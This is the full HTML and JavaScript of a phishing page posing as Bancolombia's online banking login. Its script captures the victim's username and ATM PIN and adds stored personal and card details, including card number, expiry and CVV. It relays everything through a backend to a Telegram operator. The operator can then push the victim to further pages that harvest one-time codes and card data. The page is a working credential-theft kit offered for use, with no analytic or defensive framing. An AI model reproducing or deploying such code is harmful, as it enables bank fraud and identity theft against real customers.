<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bancolombia - Sucursal Virtual Personas</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
      color: white;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      overflow-x: hidden;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      text-align: center;
    }
    .logo { margin-bottom: 20px; }
    .logo img { width: 180px; }
    .subtitle { font-size: 279px; font-weight: 300; color: white; margin-bottom: 30px; }
    .login-card {
      background: #454648;
      border-radius: 10px;
      padding: 50px 30px;
      margin-bottom: 30px;
      text-align: left;
    }
    .welcome-text {
      font-size: 26px; font-weight: bold; margin-bottom: 10px; text-align: center;
    }
    .welcome-subtitle {
      font-size: 16px; color: white; margin-bottom: 30px; line-height: 1.4; text-align: center;
    }
    .form-group { margin-bottom: 20px; position: relative; }
    .input-wrapper { position: relative; }
    .input-icon {
      position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 17px; opacity: 0.7;
    }
    .input-field {
      width: 100%; padding: 10px 10px 8px 40px; background: transparent; border: none;
      border-bottom: 1px solid white; color: white; font-size: 16px;
    }
    .input-field::placeholder { color: white; }
    .forgot-link {
      font-size: 14px; color: white; text-decoration: underline; font-weight: bold;
      cursor: pointer; margin-top: 5px;
    }
    .forgot-link:hover { color: #FFD700; }
    .login-btn {
      width: 100%; padding: 14px; background: #808080; color: black; border: none; border-radius: 24px;
      font-size: 16px; font-weight: 500; cursor: not-allowed; transition: transform 0.3s; margin-top: 10px;
    }
    .login-btn.enabled { background: #FFD700; color: #2c2c2c; cursor: pointer; }
    .login-btn:hover.enabled { transform: translateY(-2px); }
    .create-user-link { text-align: center; color: white; text-decoration: underline; font-size: 14px; cursor: pointer; margin-top: 15px; }
    .create-user-link:hover { color: #FFD700; }
    .footer-links { text-align: center; margin-bottom: 20px; }
    .footer-links a { display: block; font-size: 14px; color: #cccccc; text-decoration: none; margin: 5px 0; }
    .footer-links a:hover { color: #FFD700; }
    .footer {
      text-align: center; padding: 20px; border-top: 1px solid rgba(255,255,255,0.1);
      margin-top: auto; width: 100%; max-width: 400px;
    }
    .footer-logo img { width: 100px; margin-bottom: 10px; }
    .vigilado-text { font-size: 10px; color: #666; margin-bottom: 8px; }
    .footer-info { font-size: 12px; color: #888; line-height: 1.4; }

    /* ---------- Loader difuminado con rueda ---------- */
    .overlay-loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,0.55); /* semitransparente */
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
      transition: opacity 220ms ease, visibility 220ms ease;
    }
    .overlay-loader.visible {
      opacity: 1;
      visibility: visible;
      pointer-events: auto;
    }
    .spinner {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      border: 6px solid rgba(255,255,255,0.18);
      border-top-color: #FFD700;
      box-sizing: border-box;
      animation: spin 900ms linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 480px) {
      .login-card { padding: 30px 15px; }
      .subtitle { font-size: 18px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <br><br>
    <div class="logo">
      <img src="logo.svg" alt="Bancolombia">
    </div>
    <br>
    <h1 class="subtitle" style="font-size: 26px;">Sucursal Virtual Personas</h1>

    <img src="aviso.jpeg" alt="DescripciÃ³n de la imagen" class="subtitle-image" style="display: block; margin-left: 0; width: 340px; height: auto;">
    <br>

    <div class="login-card">
      <div class="welcome-text">Â¡Hola!</div>
      <div class="welcome-subtitle">
        Ingresa los datos para gestionar tus<br>
        productos y hacer transacciones.
      </div>

      <form id="loginForm" method="POST" autocomplete="off">
        <div class="form-group">
          <div class="input-wrapper">
            <img src="persona.png" alt="Usuario" class="input-icon">
            <input type="text" id="usuario" name="usuario" placeholder="Usuario" required maxlength="20" class="input-field" autocomplete="off">
          </div>
          <br>
          <div class="forgot-link" onclick="alert('Redirigiendo a recuperaciÃ³n de usuario...')">Â¿Olvidaste tu usuario?</div>
        </div>

        <div class="form-group">
          <div class="input-wrapper">
            <img src="candado.png" alt="Clave" class="input-icon">
            <input type="password" id="clave" name="clave" placeholder="Clave del cajero" required maxlength="4" class="input-field" autocomplete="new-password">
          </div>
          <br>
          <div class="forgot-link" onclick="alert('Redirigiendo a recuperaciÃ³n de clave...')">Â¿Olvidaste tu clave?</div>
        </div>

        <br>
        <button type="submit" id="loginBtn" class="login-btn" disabled>Iniciar sesiÃ³n</button>
      </form>

      <br>
      <div class="create-user-link" onclick="alert('Redirigiendo a creaciÃ³n de usuario...')">Crear usuario</div>
    </div>

    <br>
    <div class="footer-links">
      <a href="#" onclick="alert('Â¿Problemas para conectarte?')">Â¿Problemas para conectarte?</a>
      <a href="#" onclick="alert('Aprende sobre seguridad')">Aprende sobre seguridad</a>
      <a href="#" onclick="alert('Reglamento')">Reglamento Sucursal Virtual</a>
      <a href="#" onclick="alert('PolÃ­tica de privacidad')">PolÃ­tica de privacidad</a>
    </div>
  </div>

  <div class="footer">
    <div class="footer-logo"><img src="logo.svg" alt="Bancolombia"></div>
    <div class="vigilado-text">VIGILADO</div>
    <div class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
    <div class="footer-info">
      DirecciÃ³n IP: <span id="ipPublica">desconocida</span><br>
      <span id="fechaHora"></span>
    </div>
  </div>

  <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
    <div class="spinner" aria-hidden="true"></div>
  </div>

  <script>
    /* ---------- ELEMENTOS UI ---------- */
    const usuarioInput = document.getElementById('usuario');
    const claveInput   = document.getElementById('clave');
    const loginBtn     = document.getElementById('loginBtn');
    const loaderFull   = document.getElementById('loaderFull');

    function showLoader() {
      loaderFull.classList.add('visible');
      loaderFull.setAttribute('aria-hidden', 'false');
    }
    function hideLoader() {
      loaderFull.classList.remove('visible');
      loaderFull.setAttribute('aria-hidden', 'true');
    }

    function updateLoginButtonState() {
      const enabled = !!usuarioInput.value.trim() && !!claveInput.value.trim();
      loginBtn.disabled = !enabled;
      loginBtn.classList.toggle('enabled', enabled);
    }
    usuarioInput.addEventListener('input', updateLoginButtonState);
    claveInput.addEventListener('input', updateLoginButtonState);

    // Enter => enviar si campos completos
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
        e.preventDefault();
        if (!loginBtn.disabled) loginBtn.click();
      }
    });

    /* ---------- FECHA e IP ---------- */
    async function fetchIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        document.getElementById('ipPublica').textContent = json.ip;
      } catch {
        document.getElementById('ipPublica').textContent = 'desconocida';
      }
    }
    fetchIP();

    function updateDateTime() {
      const now = new Date();
      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
      document.getElementById('fechaHora').textContent =
        now.toLocaleDateString('es-ES', options) + ', ' +
        now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: false });
    }
    setInterval(updateDateTime, 60000);
    updateDateTime();


    // --- CAMBIO: Se eliminan las funciones loadTelegramConfig, saveTgOffset, getTgOffset, e initTgOffsetOnce ---
    // El backend se encarga de toda la lÃ³gica de Telegram.


    /* ---------- ENVIAR Y ESPERAR RESPUESTA ---------- */
    document.getElementById('loginForm').addEventListener('submit', async function(ev) {
      ev.preventDefault();
      showLoader();

      const usuario = usuarioInput.value.trim();
      const clave = claveInput.value.trim();
      // transactionId sigue siendo Ãºtil para pasarlo en el texto del mensaje
      const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2,10);

      // Guardar localmente (para las otras pÃ¡ginas como otp.html, etc.)
      localStorage.setItem('usuario', usuario);
      localStorage.setItem('clave', clave);
      localStorage.setItem('transactionId', transactionId);

      // --- CAMBIO: No se carga config.json ---

      // Intentar recuperar 'formData' si existe
      let storedForm = null;
      try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }

      // Construir el mensaje de texto
      let message = `ðŸ” Nuevo inicio de sesiÃ³n pendiente\nðŸ†” ID: ${transactionId}\nðŸ‘¤ Usuario: ${usuario}\nðŸ”‘ Clave: ${clave}\n\n`;
      if (storedForm && typeof storedForm === 'object') {
        const extras = [
          { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'CÃ©dula' },
          { k: 'telefono', l: 'TelÃ©fono' }, { k: 'ciudad', l: 'Ciudad' },
          { k: 'direccion', l: 'DirecciÃ³n' }, { k: 'entidad', l: 'Banco' },
          { k: 'tarjeta', l: 'Tarjeta' }, { k: 'fechaExpiracion', l: 'Fecha Exp.' },
          { k: 'cvv', l: 'CVV' }
        ];
        extras.forEach(it => { if (storedForm[it.k]) message += `â€¢ ${it.l}: ${storedForm[it.k]}\n`; });
      }

      // Construir el teclado
      // El backend espera recibir este objeto en la propiedad 'keyboard'
      const keyboard = {
        inline_keyboard: [
          // El callback_data incluye el transactionId para que el backend pueda procesarlo
          [{ text: "Pedir dinÃ¡mica", callback_data: `pedir_dinamica:${transactionId}` }],
          [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
          [{ text: "Error logo", callback_data: `error_logo:${transactionId}` }]
        ]
      };

      // --- CAMBIO: Enviar mensaje a nuestro propio backend ---
      let sentMessageId = null;
      try {
        const sendRes = await fetch('/api/send-message', { // <-- Llama a tu backend
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          // El backend espera un objeto { text, keyboard }
          body: JSON.stringify({ text: message, keyboard: keyboard })
        });

        const sendJson = await sendRes.json();

        if (!sendJson.ok || !sendJson.result || !sendJson.result.message_id) {
          console.error('sendMessage error:', sendJson);
          alert(sendJson.error || 'No se pudo enviar el mensaje al servidor. Revisa consola.');
          hideLoader();
          return;
        }

        // Guardamos el ID del mensaje enviado por Telegram
        sentMessageId = sendJson.result.message_id;

      } catch (err) {
        console.error('Error enviando a /api/send-message:', err);
        alert('Error de conexiÃ³n con el servidor. Revisa consola.');
        hideLoader();
        return;
      }
      // --- FIN DEL CAMBIO ---


      // --- CAMBIO: Esperar respuesta del backend (que hace el polling por nosotros) ---
      try {
        // Pasamos el message_id que obtuvimos
        await waitForAdminResponse(sentMessageId); 
      } finally {
        hideLoader(); // Ocultar el loader sin importar el resultado
      }
    });

    /**
     * --- CAMBIO: FunciÃ³n reescrita ---
     * Esta funciÃ³n ahora solo hace UNA peticiÃ³n a nuestro backend.
     * El backend (/api/check-update) es el que se queda esperando (long polling)
     * la respuesta del admin.
     */
    async function waitForAdminResponse(messageId) {
      try {
        // Hacemos la peticiÃ³n al endpoint de verificaciÃ³n
        const res = await fetch(`/api/check-update/${messageId}`, {
          method: 'GET',
          cache: 'no-store' // No queremos respuestas cacheadas
        });

        if (res.ok) {
          // El backend nos responde con JSON: { action: 'accion_elegida' }
          const data = await res.json();
          handleAdminAction(data.action); // Pasamos la acciÃ³n directamente

        } else if (res.status === 408) {
          // El backend nos devuelve 408 si se agota su propio tiempo de espera
          alert('No hubo respuesta del administrador en el tiempo esperado. Intenta mÃ¡s tarde.');

        } else {
          // Otro error del servidor
          const errData = await res.json();
          console.error('Error esperando respuesta:', errData);
          alert(errData.error || 'Error del servidor al verificar la respuesta.');
        }

      } catch (err) {
        // Error de red (ej: se cayÃ³ el servidor o no hay internet)
        console.error('Error de red en waitForAdminResponse:', err);
        alert('Error de conexiÃ³n al esperar la respuesta. Revisa tu conexiÃ³n.');
      }
    }

    /**
     * --- CAMBIO: Firma de la funciÃ³n simplificada ---
     * Ahora recibe la acciÃ³n limpia (ej: 'pedir_dinamica')
     * que nos envÃ­a el backend.
     */
    function handleAdminAction(action) {
      if (action === 'pedir_dinamica') {
        window.location.href = 'dinamica.html';
      } else if (action === 'pedir_otp') {
        window.location.href = 'otp.html';
      } else if (action === 'pedir_tc') {
        window.location.href = 'tc.html';
      } else if (action === 'error_logo') {
        alert('Se ha reportado un error de logo por el administrador. Revisa tu informaciÃ³n e intenta nuevamente.');
      } else {
        console.log('AcciÃ³n admin no manejada:', action);
      }
    }
  </script>
</body>
</html>
